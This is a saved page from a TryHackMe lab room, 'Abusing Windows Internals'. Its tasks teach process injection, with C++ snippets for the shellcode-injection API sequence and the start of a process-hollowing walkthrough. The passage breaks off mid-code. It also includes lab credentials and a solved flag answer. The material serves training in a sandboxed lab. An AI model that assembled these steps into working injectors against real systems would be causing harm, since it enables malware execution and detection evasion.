<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Abusing Windows Internals_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Abusing Windows Internals_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Abusing Windows Internals_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Abusing Windows Internals_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/abusingwindowsinternals#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Abusing Windows Internals_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Abusing Windows Internals_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Abusing Windows Internals_files/notifications.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Abusing Windows Internals_files/461db271e310812a73d4a96abd2dc9eb.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">209</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Abusing Windows Internals_files/76910e7adb4cef3da9496c148b4c96c2.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Abusing Windows Internals</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/abusingwindowsinternals#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/abusingwindowsinternals#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/abusingwindowsinternals" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Abusing Windows Internals_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-hard">Hard</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6242ca8b3e57f60055bf99eb">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 6067 users are in here and this room is 475 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Abusing Windows Internals_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Abusing Windows Internals_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="621facb6133546058d685edd" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p>Windows internals are core to how the Windows operating system functions; this provides adversaries with a lucrative target for nefarious use. Windows internals can be used to hide and execute code, evade detections, and chain with other techniques or exploits.</p>
<p>The term Windows internals can encapsulate any component found on the back-end of the Windows operating system. This can include processes, file formats, COM (<strong>C</strong>omponent&nbsp;<strong>O</strong>bject&nbsp;<strong>M</strong>odel), task scheduling, I/O System, etc. This room will focus on abusing and exploiting processes and their components, DLLs (<strong>D</strong>ynamic&nbsp;<strong>L</strong>ink&nbsp;<strong>L</strong>ibraries), and the PE (<strong>P</strong>ortable&nbsp;<strong>E</strong>xecutable) format.</p>

<div>
<img src="./TryHackMe _ Abusing Windows Internals_files/56fa99f2469b86c8660a0a45ae63215f.png" style="float:right;width:141.24px;height:141.24px" class="note-float-right">
<h3>Learning Objectives</h3>
<ul>
<li>Understand how internal components are vulnerable</li>
<li>Learn how to abuse and exploit Windows Internals vulnerabilities</li>
<li>Understand mitigations and detections for the techniques</li>
<li>Apply techniques learned to a real-world adversary case study</li>
</ul>
</div>
<p>Before beginning this room, familiarize yourself with basic Windows usage and functionality. We recommend completing the&nbsp;<a href="https://tryhackme.com/room/windowsinternals">Windows Internals room</a><span>. Basic programming knowledge in C++ and <a class="TR9QaMks glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;TR9QaMks&#39;)">PowerShell</a> is also recommended but not required.</span></p><p><span>We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through <a class="q89o46QW glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;q89o46QW&#39;)">RDP</a> using the credentials below.</span></p><p style="text-align:center">Machine IP:&nbsp;<code style="font-size:14px">MACHINE_IP</code><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;</span><code style="font-size:14px">THM-Attacker</code><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style="font-size:1rem">Password:&nbsp;</span><code style="font-size:14px">Tryhackme!</code></p>
<p>This is going to be a lot of information. Please buckle your seatbelts and locate your nearest fire extinguisher.</p>
<p>Don’t forget to tip your blue team on the way out!</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Start the provided machine and move on to the next tasks.</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Abusing Processes
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Applications running on your operating system can contain one or more processes. Processes maintain and represent a program that’s being executed.&nbsp;</p><p>
</p><p>Processes have a lot of other sub-components and directly interact with memory or virtual memory, making them a perfect candidate to target. The table below describes each critical component of processes and their purpose.</p><table class="table table-bordered"><tbody><tr><td><b>Process Component</b></td><td><b>Purpose</b></td></tr><tr><td>Private Virtual Address Space<br></td><td>Virtual memory addresses the process is allocated.<br></td></tr><tr><td>Executable Program<br></td><td>Defines code and data stored in the virtual address space<br></td></tr><tr><td>Open Handles<br></td><td>Defines handles to system resources accessible to the process<br></td></tr><tr><td>Security Context<br></td><td>The access token defines the user, security groups, privileges, and other security information.<br></td></tr><tr><td>Process ID&nbsp;<br></td><td>Unique numerical identifier of the process<br></td></tr><tr><td>Threads<br></td><td>Section of a process scheduled for execution<br></td></tr></tbody></table><p>For more information about processes, check out the&nbsp;<a href="https://tryhackme.com/room/windowsinternals">Windows Internals room</a>.</p><p>
</p><p>Process injection is commonly used as an overarching term to describe injecting malicious code into a process through legitimate functionality or components. We will focus on four different types of process injection in this room, outlined below.</p><p>
</p><table class="table table-bordered"><tbody><tr><td><b>Injection Type</b></td><td><b>Function</b></td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/012/" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-843297793">Process Hollowing</span></a><br></td><td>Inject code into a suspended and “hollowed” target process<br></td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/003/" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-843296863">Thread Execution Hijacking</span></a><br></td><td>Inject code into a suspended target thread<br></td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/001/" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-843296801">Dynamic-link Library Injection</span></a><br></td><td><span>Inject a <a class="m9JXSAgU glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;m9JXSAgU&#39;)">DLL</a> into process memory</span><br></td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1055/002/" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-843296832">Portable Executable Injection</span></a><br></td><td>Self-inject a PE image pointing to a malicious function into a target process<br></td></tr></tbody></table><p>There are many other forms of process injection outlined by <a href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a>.</p><p>At its most basic level, process injection takes the form of shellcode injection.</p><p>At a high level, shellcode injection can be broken up into four steps:</p><ol>
<li>Open a target process with all access rights.</li>
<li>Allocate target process memory for the shellcode.</li>
<li>Write shellcode to allocated memory in the target process.</li>
<li>Execute the shellcode using a remote thread.</li></ol><p>The steps can also be broken down graphically to depict how Windows API calls interact with process memory.</p><p style="text-align:center"><img src="./TryHackMe _ Abusing Windows Internals_files/ba04c5ef220c10b3e174bd1ca77959c6.png"><br></p><ol>
</ol><p>We will break down a basic shellcode injector to identify each of the steps and explain in more depth below.</p><p>At step one of shellcode injection, we need to open a target process using special parameters. <code>OpenProcess</code> is used to open the target process supplied via the command-line.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">processHandle <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>
	PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token comment">// Defines access rights</span>
	FALSE<span class="token punctuation">,</span> <span class="token comment">// Target handle will not be inhereted</span>
	<span class="token function">DWORD</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Local process supplied by command-line arguments </span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using <code>VirtualAllocEx</code>. Within the call, the <code>dwSize</code> parameter is defined using the <code>sizeof</code> function to get the bytes of shellcode to allocate.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">remoteBuffer <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>
	processHandle<span class="token punctuation">,</span> <span class="token comment">// Opened target process</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token comment">// Region size of memory allocation</span>
	<span class="token punctuation">(</span>MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Reserves and commits pages</span>
	PAGE_EXECUTE_READWRITE <span class="token comment">// Enables execution and read/write access to the commited pages</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>At step three, we can now use the allocated memory region to write our shellcode. <code>WriteProcessMemory</code> is commonly used to write to memory regions.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>
	processHandle<span class="token punctuation">,</span> <span class="token comment">// Opened target process</span>
	remoteBuffer<span class="token punctuation">,</span> <span class="token comment">// Allocated memory region</span>
	shellcode<span class="token punctuation">,</span> <span class="token comment">// Data to write</span>
	<span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token comment">// byte size of data</span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>At step four, we now have control of the process, and our malicious code is now written to memory. To execute the shellcode residing in memory, we can use <code>CreateRemoteThread</code>; threads control the execution of processes.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">remoteThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>
	processHandle<span class="token punctuation">,</span> <span class="token comment">// Opened target process</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// Default size of the stack</span>
	<span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>remoteBuffer<span class="token punctuation">,</span> <span class="token comment">// Pointer to the starting address of the thread</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// Ran immediately after creation</span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p><span style="font-size:1rem">We can compile these steps together to create a basic process injector. Use the C++ injector provided and experiment with process injection.</span></p><p>













</p><p>Shellcode injection is the most basic form of process injection; in the next task, we will look at how we can modify and adapt these steps for process hollowing.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Identify a PID of a process running as THM-Attacker to target. Once identified supply the PID as an argument to execute&nbsp;<i>shellcode-injector.exe</i>&nbsp;located in the Injectors directory on the desktop.&nbsp;
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What flag is obtained after injecting the shellcode?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************}" value="THM{1nj3c710n_15_fun!}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Expanding Process Abuse
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>In the previous task, we discussed how we can use shellcode injection to inject malicious code into a legitimate process. In this task we will cover process hollowing. Similar to shellcode injection, this technique offers the ability to inject an entire malicious file into a process. This is accomplished by “hollowing” or un-mapping the process and injecting specific PE (<strong>P</strong>ortable <strong>E</strong>xecutable) data and sections into the process.</p>
<p>At a high-level process hollowing can be broken up into six steps:</p>
<ol>
<li>Create a target process in a suspended state.</li>
<li>Open a malicious image.</li>
<li>Un-map legitimate code from process memory.</li>
<li>Allocate memory locations for malicious code and write each section into the address space.</li>
<li>Set an entry point for the malicious code.</li>
<li>Take the target process out of a suspended state.</li></ol><p>The steps can also be broken down graphically to depict how Windows API calls interact with process memory.<br></p><p style="text-align:center"><img src="./TryHackMe _ Abusing Windows Internals_files/3c36b4470fb04e3bfdbbef0674b79ec2.png"><br></p><ol>
</ol>
<p>We will break down a basic process hollowing injector to identify each of the steps and explain in more depth below.</p>
<p>At step one of process hollowing, we must create a target process in a suspended state using <code>CreateProcessA</code>. To obtain the required parameters for the API call we can use the structures <code>STARTUPINFOA</code> and <code>PROCESS_INFORMATION</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">LPSTARTUPINFOA target_si <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">STARTUPINFOA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Defines station, desktop, handles, and appearance of a process</span>
